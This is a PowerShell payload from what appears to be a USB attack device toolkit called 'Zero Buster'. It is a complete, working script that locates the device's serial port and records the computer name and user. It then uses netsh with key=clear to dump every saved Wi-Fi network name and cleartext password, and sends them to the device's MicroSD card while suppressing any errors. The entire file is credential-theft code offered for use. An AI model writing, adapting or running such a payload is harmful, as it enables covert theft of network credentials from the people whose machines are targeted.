<#
.SYNOPSIS
    Zero Buster - Payload 05: Windows Wi-Fi (Volcado de Credenciales)
.DESCRIPTION
    Extrae perfiles Wi-Fi guardados y contraseñas en claro tanto en Windows
    en español como en inglés, y los transmite vía USB CDC a la MicroSD.
.AUTHOR
    @DonJulve
#>

Add-Type -AssemblyName System.IO.Ports

$targetPort = $null
for ($i = 0; $i -lt 60; $i++) {
    $availablePorts = [System.IO.Ports.SerialPort]::GetPortNames()
    if ($availablePorts.Count -gt 0) {
        $targetPort = ($availablePorts | Sort-Object { [int]($_ -replace '\D') } | Select-Object -Last 1)
        if ($availablePorts.Count -gt 1 -or $targetPort -ne "COM1") {
            break
        }
    }
    Start-Sleep -Milliseconds 250
}

if (-not $targetPort -and $availablePorts.Count -gt 0) {
    $targetPort = $availablePorts[-1]
}

if (-not $targetPort) { exit 1 }

Start-Sleep -Milliseconds 500

$serial = New-Object System.IO.Ports.SerialPort $targetPort, 115200, None, 8, One
$serial.ReadTimeout = 2000
$serial.WriteTimeout = 5000
$serial.DtrEnable = $true
$serial.RtsEnable = $true

try {
    $serial.Open()
    $serial.WriteLine("========================================")
    $serial.WriteLine("  ZERO BUSTER - WIFI DUMP               ")
    $serial.WriteLine("========================================")
    $serial.WriteLine("[*] Host     : " + $env:COMPUTERNAME)
    $serial.WriteLine("[*] User     : " + $env:USERNAME)
    $serial.WriteLine("[*] Date     : " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
    $serial.WriteLine("----------------------------------------")

    $raw = netsh wlan show profiles 2>$null
    $profiles = @()
    if ($raw) {
        $raw | Select-String ':\s+(.+)$' | ForEach-Object {
            $val = $_.Matches.Groups[1].Value.Trim()
            if ($val -and $val -notmatch '<(ninguno|none)>') {
                $profiles += $val
            }
        }
    }

    if ($profiles.Count -eq 0) {
        $serial.WriteLine("[!] No Wi-Fi profiles found or WLAN service disabled.")
    } else {
        $serial.WriteLine("[+] Found " + $profiles.Count + " profile(s):")
        foreach ($pn in $profiles) {
            $serial.WriteLine("  SSID: " + $pn)
            $detail = netsh wlan show profile name="$pn" key=clear 2>$null
            # Bilingüe: 'Key Content' (EN) y 'Contenido de la clave' (ES)
            $keyMatch = ($detail | Select-String '(?i)(Key Content|Contenido de la clave)\s*:\s*(.+)$' | Select-Object -First 1)
            if ($keyMatch) {
                $serial.WriteLine("  KEY : " + $keyMatch.Matches.Groups[2].Value.Trim())
            } else {
                $serial.WriteLine("  KEY : (open / not stored)")
            }
            $serial.WriteLine("  ---")
        }
    }
    $serial.WriteLine("========================================")
    $serial.WriteLine("[+] Wi-Fi dump completed.")
} catch {
    # Silencioso
} finally {
    try {
        $serial.WriteLine("<<<EOF>>>")
        Start-Sleep -Milliseconds 200
        $serial.Close()
    } catch {}
}

exit

